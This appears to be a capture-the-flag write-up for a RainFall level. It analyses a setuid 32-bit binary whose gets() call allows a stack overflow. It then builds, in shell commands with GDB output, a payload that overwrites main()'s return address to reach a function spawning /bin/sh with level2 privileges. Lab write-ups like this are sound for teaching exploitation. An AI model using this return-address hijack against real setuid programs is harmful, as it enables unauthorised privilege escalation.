# RainFall (level0)

In this project, we try to **exploit binaries**.
By doing so, we wish to read the `/home/user/level2/.pass` file, containing our flag serving as the password for the next level.

## Binary decompilation.

It is a **ELF 32-bit x86 LSB** executable as stated by the command `file -b ~/level1` commands.

We use `objdump -d ~/level1` to deassemble the binary. We stored it's truncated result in the [source.asm](./source.asm) file.

We also decompile the binary using a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra). We performed analysis and manual refactoring to isolate the vulnerability and make the relevant C code more readable. The result is saved in the [source.c](./source.c) file and generated through the [decompile.sh](./Ressources/decompile.sh) shell script.

## Binary particularities

By connecting via ssh (cf. [ssh.sh](./Ressources/ssh.sh)), we made some observations.

On login or by executing `checksec --kernel && checksec --file ~/level1`, we discover:
```sh
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```

The binary is owned by `level2` and has the `setuid` flag set.
```sh
$ ls -la ~/level1
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 /home/user/level1/level1
```

Useful documentation:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASRL): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.c)) is subject to a "Use of Inherently Dangerous Function" ([CWE-242](http://cwe.mitre.org/data/definitions/242.html)) as state by the [`gets()` man page](https://man7.org/linux/man-pages/man3/gets.3.html).

`gets()` does not perform a buffer overrun check. It introduces a **stack-overflow** opportunity.  
In parallel, the kernel and binary do not implement modern security practices *(Stack Canaries, No-eXecute bit)* that would make it harder to exploit.

## Vulnerability analysis

We have a **32-bit x86** (elf32-i386) binary containing two user defined functions (`main()`, `run()`).
To perform a **stack overflow** attack, we need to analyze and visualize the program's [**call stack**](https://en.wikipedia.org/wiki/Call_stack). More specifically the target functions **stack frame**.  
We target the `main()` function.

A function's lifetime is split into 4 steps:
1. **Call/Setup (Caller)**:
    Prepares arguments (via registers or stack) and pushes the **Return Address** onto the stack (via the `CALL` instruction).
2. **Prologue (Callee)**:
    Saves the caller's base pointer to the stack and updates it to the current stack pointer to establish a new frame.
3. **Runtime (Callee)**:
    Executes function logic and allocates space for local variables.
4. **Epilogue (Callee)**:
    Deallocates the stack frame (ESP is restored to EBP), restores the saved caller's stored base pointer, and executes `RET` to jump to the Return Address.

We execute our **stack overflow** typically at the Runtime stage. At that point, memory should look like this:
```ruby
    HIGHER MEMORY ADDRESSES    
+-----------------------------+
|    Stack-Based arguments    | (0-N bytes)
+-----------------------------+
|        Return address       | (4 bytes)
+-----------------------------+
| Caller's Stack Base Pointer | (4 bytes)
+-----------------------------+ <--- Stack Base Pointer (EBP)
|         Stack Canary        | (0-4 bytes)
+-----------------------------+
|           Padding           | (0-15 bytes)
+-----------------------------+
|                             |
|                             |
|                             |
|       Local Variables       | (0-N bytes)
|     (+ alignment bytes)     |
|                             |
|                             |
|                             |
+-----------------------------+ <--- Stack Pointer (ESP)
     LOWER MEMORY ADDRESSES    
```
Notices:
- The stack is little-endian encoded. In our payload, multi-byte values must be byte-reversed.
- On modern optimized systems, the first function parameters are typically passed via volatile registers (ex: EAX, ECX, EDX)
- The stack is built downwards, from higher to lowerer memory addresses. Local variables are written upwards.
- The function's stack frame begins officially from the last address pushed into the **EBP** register.

As the kernel's [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) option is disabled, we can use [GDB](https://www.sourceware.org/gdb/) identify the static addresses in a given stack frame.
```sh
$ gdb -batch -ex "start" -ex "info frame" ./level1
Temporary breakpoint 1 at 0x8048483

Temporary breakpoint 1, 0x08048483 in main ()
Stack level 0, frame at 0xbffff740:
 eip = 0x8048483 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff738, args: 
 Locals at 0xbffff738, Previous frame's sp is 0xbffff740
 Saved registers:
  ebp at 0xbffff738, eip at 0xbffff73c
```

After the additional analysis of the [source.asm](./source.asm) file,  
we determined that the `main()` function stack frame would ressemble this:
```ruby
      HIGHER MEMORY ADDRESSES     
+--------------------------------+
|     main()'s Return address    | (4 bytes @ 0xbffff73c)
+--------------------------------+ <--- Begin of `main()` stack frame.
|   Caller's Stack Base Pointer  | (4 bytes @ 0xbffff738)
+--------------------------------+ <--- Stack Base Pointer (EBP)
|  | Alignment  | (8 bytes)      |
+  +------------+                |
|  |            |                |
|  |            |                |
|  |   Buffer   | (64 bytes)     | (88 bytes)
|  |            |                |
|  |            |                |
+  +------------+ (@ 0xbffff6f0) |
|  | Alignment  | (16 bytes)     |
+--------------------------------+ <--- Stack Pointer (ESP)
      LOWER MEMORY ADDRESSES      
```

## Exploit

By overwriting the **Return Address**, we can hijack the program's control flow to execute arbitrary code: hidden functions, library code, or even injected [shellcode](https://en.wikipedia.org/wiki/Shellcode) payloads.

We wish to execute commands such as `system("/bin/sh")` or `execve("/bin/sh", NULL, NULL)` to spawn a new shell that inherits the EUID *(level2)* of the process.

The `run()` function available in the binary calls `system("/bin/sh")` for us. It's stack frame starts at the following address: `0x08048444` (or `\x44\x84\x04\x08` in **little-endian hexadecimal byte escaped format** or `\104\204\004\010` in **little-endian octal byte escaped format**).

```sh
$ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
$ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
$ run_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
$ payload="${local_vars_filler}${ebp_filler}${run_retaddr}";
$ (printf "%b" "$payload\n") | ~/level1
Good... Wait what?
Segmentation fault (core dumped)
```

The `run()` function has successfully been called, as confirmed by the output.  
However, there are two issues we wish to resolve.

**Segmentation Fault:**

Since `run()` was not invoked via a `CALL` instruction, the stack lacks the standard Return Address. Consequently, its stack frame is built with a **4 byte offset** relative to `main()`'s, while otherwise maintaining the expected internal structure. As such, we know exactly where the Return Address is expected and can manually provide one to maintain control or trigger a clean exit.

```ruby
      HIGHER MEMORY ADDRESSES   
+--------------------------------+
|   next_fn()'s Return address   | (4 bytes @ 0xbffff738)
+--------------------------------+
|     main()'s Return address    | (4 bytes @ 0xbffff73c)
+--------------------------------+ <--- Begin of `main()` stack frame.
|   Caller's Stack Base Pointer  | (4 bytes @ 0xbffff738)
+--------------------------------+ <--- Stack Base Pointer (EBP)
|               ...              |
      LOWER MEMORY ADDRESSES      
```

```sh
$ gdb -batch -ex "start" -ex "p exit" ./level1
Temporary breakpoint 1 at 0x8048483

Temporary breakpoint 1, 0x08048483 in main ()
$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
# hexadecimal => \xe0\xeb\xe5\xb7
# octal => \340\353\345\267
```

```sh
$ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
$ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
$ run_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
$ exit_retaddr="$(printf "%s" "\340\353\345\267")"; # `run()`s Return address, set to `exit()` = 4 bytes.
$ payload="${local_vars_filler}${ebp_filler}${run_retaddr}${exit_retaddr}";
$ (printf "%b" "$payload\n") | ~/level1
Good... Wait what?
```

**Premature shell exit**

The spawned shell closes immediately because it interprets the `EOF` signal sent once the piped input stream finishes.
To prevent this, we must keep the input stream's write end open for the lifetime of the spawned shell.

```sh
$ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
$ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
$ run_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
$ exit_retaddr="$(printf "%s" "\340\353\345\267")"; # `run()`s Return address, set to `exit()` = 4 bytes.
$ payload="${local_vars_filler}${ebp_filler}${run_retaddr}${exit_retaddr}";
$ (printf "%b" "$payload\n"; cat -) | ~/level1
Good... Wait what?
```

And there it is.
